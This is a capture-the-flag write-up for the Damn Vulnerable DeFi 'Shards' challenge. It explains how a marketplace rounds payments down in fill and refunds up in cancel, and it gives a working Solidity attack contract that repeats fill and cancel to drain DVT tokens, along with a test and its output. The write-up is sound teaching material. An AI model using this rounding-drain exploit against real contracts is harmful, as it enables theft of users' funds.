# Challenge - Shards

The Shards NFT marketplace is a permissionless smart contract enabling holders of Damn Valuable NFTs to sell them at any price (expressed in USDC).

These NFTs could be so damn valuable that sellers can offer them in smaller fractions (“shards”). Buyers can buy these shards, represented by an ERC1155 token. The marketplace only pays the seller once the whole NFT is sold.

The marketplace charges sellers a 1% fee in Damn Valuable Tokens (DVT). These can be stored in a secure on-chain vault, which in turn integrates with a DVT staking system.

Somebody is selling one NFT for… wow, a million USDC?

You better dig into that marketplace before the degens find out.

## Objective of CTF

You start with no DVTs. Rescue as much funds as you can in a single transaction, and deposit the assets into the designated recovery account.

## Vulnerability Analysis

### Root Cause: Rounding Error

The marketplace offers a `fill` function that allows a buyer to partially or fully fulfill an offer. It first validates the input parameters, then transfers the `paymentToken` (e.g. DVT token) from the buyer to the marketplace. The relevant code is shown below:

```solidity
function fill(uint64 offerId, uint256 want) external returns (uint256 purchaseIndex) {
    Offer storage offer = offers[offerId];
    if (want == 0) revert BadAmount();
    if (offer.price == 0) revert UnknownOffer();
    if (want > offer.stock) revert OutOfStock();
    if (!offer.isOpen) revert NotOpened(offerId);

    offer.stock -= want;
    purchaseIndex = purchases[offerId].length;
    uint256 _currentRate = rate;
    purchases[offerId].push(
        Purchase({
            shards: want,
            rate: _currentRate,
            buyer: msg.sender,
            timestamp: uint64(block.timestamp),
            cancelled: false
        })
    );
    paymentToken.transferFrom(
        msg.sender, address(this), want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
    );
    if (offer.stock == 0) _closeOffer(offerId);
}
```

However, the payment amount is calculated using the `mulDivDown` function, which rounds down the fractional part of the calculation. This introduces a potential vulnerability: we can use the `fill` function to buy NFT shards without actually paying any `DVT` tokens.

```solidity
function cancel(uint64 offerId, uint256 purchaseIndex) external {
    Offer storage offer = offers[offerId];
    Purchase storage purchase = purchases[offerId][purchaseIndex];
    address buyer = purchase.buyer;

    if (msg.sender != buyer) revert NotAllowed();
    if (!offer.isOpen) revert NotOpened(offerId);
    if (purchase.cancelled) revert AlreadyCancelled();
    if (
        purchase.timestamp + CANCEL_PERIOD_LENGTH < block.timestamp
            || block.timestamp > purchase.timestamp + TIME_BEFORE_CANCEL
    ) revert BadTime();

    offer.stock += purchase.shards;
    assert(offer.stock <= offer.totalShards); // invariant
    purchase.cancelled = true;

    emit Cancelled(offerId, purchaseIndex);

    paymentToken.transfer(buyer, purchase.shards.mulDivUp(purchase.rate, 1e6));
}
```

The marketplace also provides a `cancel` function, allowing users to cancel their NFT purchases and receive a refund in `DVT` tokens. The refund amount is calculated using the `mulDivUp` function, which rounds up the fractional part.

By exploiting this rounding discrepancy, we can purchase NFT shards without paying any DVT upfront, and then immediately cancel the purchase to receive a DVT refund. The marketplace’s rounding error in handling the fill logic allows us to exploit this and gain extra DVT tokens.

### Attack steps:

1. Find a purchase amount where you can buy NFT shards without paying DVT tokens.
2. Cancel the previous purchase to receive a DVT refund from the marketplace. Repeat these two steps until the DVT tokens are fully drained from the marketplace.
3. Transfer the recovered DVT tokens to the designated recovery address.

Note: Due to gas usage limitations, we cannot drain all the DVT tokens from the marketplace in a single transaction.

## PoC test case

### Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IMarketplace {
    function fill(uint64 offerId, uint256 want) external returns (uint256 purchaseIndex);
    function cancel(uint64 offerId, uint256 purchaseIndex) external;
}

contract AttackShards {
    uint256 private constant want = 133; // maximum shards you can buy without pay any token

    address private immutable marketplace;
    address private immutable token;
    address private immutable recovery;

    constructor(address _marketplace, address _token, address _recovery) {
        marketplace = _marketplace;
        token = _token;
        recovery = _recovery;

        uint256 purchaseIndex;
        for (uint256 i; i < 7550; ++i) {
            purchaseIndex = IMarketplace(marketplace).fill(1, want);
            IMarketplace(marketplace).cancel(1, purchaseIndex);
        }

        uint256 rescuedAmount = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(recovery, rescuedAmount);
    }
}
```

### Test contract

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {
    ShardsNFTMarketplace,
    IShardsNFTMarketplace,
    ShardsFeeVault,
    DamnValuableToken,
    DamnValuableNFT
} from "../../src/shards/ShardsNFTMarketplace.sol";
import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
import {AttackShards} from "../../src/shards/AttackShards.sol";

contract ShardsChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address seller = makeAddr("seller");
    address oracle = makeAddr("oracle");
    address recovery = makeAddr("recovery");

    uint256 constant STAKING_REWARDS = 100_000e18;
    uint256 constant NFT_SUPPLY = 50;
    uint256 constant SELLER_NFT_BALANCE = 1;
    uint256 constant SELLER_DVT_BALANCE = 75e19;
    uint256 constant STAKING_RATE = 1e18;
    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;

    DamnValuableToken token;
    DamnValuableNFT nft;
    ShardsFeeVault feeVault;
    ShardsNFTMarketplace marketplace;
    DamnValuableStaking staking;

    uint256 initialTokensInMarketplace;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy NFT contract and mint initial supply
        nft = new DamnValuableNFT();
        for (uint256 i = 0; i < NFT_SUPPLY; i++) {
            if (i < SELLER_NFT_BALANCE) {
                nft.safeMint(seller);
            } else {
                nft.safeMint(deployer);
            }
        }

        // Deploy token (used for payments and fees)
        token = new DamnValuableToken();

        // Deploy NFT marketplace and get the associated fee vault
        marketplace =
            new ShardsNFTMarketplace(nft, token, address(new ShardsFeeVault()), oracle, MARKETPLACE_INITIAL_RATE);
        feeVault = marketplace.feeVault();

        // Deploy DVT staking contract and enable staking of fees in marketplace
        staking = new DamnValuableStaking(token, STAKING_RATE);
        token.transfer(address(staking), STAKING_REWARDS);
        marketplace.feeVault().enableStaking(staking);

        // Fund seller with DVT (to cover fees)
        token.transfer(seller, SELLER_DVT_BALANCE);

        // Seller opens offers in the marketplace
        vm.startPrank(seller);
        token.approve(address(marketplace), SELLER_DVT_BALANCE); // for fees
        nft.setApprovalForAll(address(marketplace), true);
        for (uint256 id = 0; id < SELLER_NFT_BALANCE; id++) {
            marketplace.openOffer({nftId: id, totalShards: NFT_OFFER_SHARDS, price: NFT_OFFER_PRICE});
        }

        initialTokensInMarketplace = token.balanceOf(address(marketplace));

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(feeVault.owner(), deployer);
        assertEq(address(feeVault.token()), address(token));
        assertEq(address(feeVault.staking()), address(staking));

        assertEq(nft.balanceOf(deployer), NFT_SUPPLY - SELLER_NFT_BALANCE);
        assertEq(nft.balanceOf(address(marketplace)), marketplace.offerCount());
        assertEq(marketplace.offerCount(), SELLER_NFT_BALANCE);
        assertEq(marketplace.rate(), MARKETPLACE_INITIAL_RATE);
        assertGt(marketplace.feesInBalance(), 0);
        assertEq(token.balanceOf(address(marketplace)), marketplace.feesInBalance());

        assertEq(staking.rate(), STAKING_RATE);
        assertEq(staking.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS);
        assertEq(token.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_shards() public checkSolvedByPlayer {
        emit log("-------------------------- Before exploit --------------------------");
        emit log_named_decimal_uint(
            "token balance in the marketplace", token.balanceOf(address(marketplace)), token.decimals()
        );
        emit log_named_decimal_uint(
            "token balance in the recovery address", token.balanceOf(recovery), token.decimals()
        );
        new AttackShards(address(marketplace), address(token), recovery);
        emit log("-------------------------- After exploit --------------------------");
        emit log_named_decimal_uint(
            "token balance in the marketplace", token.balanceOf(address(marketplace)), token.decimals()
        );
        emit log_named_decimal_uint(
            "token balance in the recovery address", token.balanceOf(recovery), token.decimals()
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Balance of staking contract didn't change
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS, "Not enough tokens in staking rewards");

        // Marketplace has less tokens
        uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");

        // All recovered funds sent to recovery account
        assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
        assertEq(token.balanceOf(player), 0, "Player still has tokens");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1);
    }
}
```

### Test Result

```
Ran 2 tests for test/shards/Shards.t.sol:ShardsChallenge
[PASS] test_assertInitialState() (gas: 80211)
[PASS] test_shards() (gas: 619630821)
Logs:
  -------------------------- Before exploit --------------------------
  token balance in the marketplace: 750.000000000000000000
  token balance in the recovery address: 0.000000000000000000
  -------------------------- After exploit --------------------------
  token balance in the marketplace: 749.924688750000000000
  token balance in the recovery address: 0.075311250000000000
  75311250000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 234.78ms (225.39ms CPU time)

Ran 1 test suite in 244.36ms (234.78ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
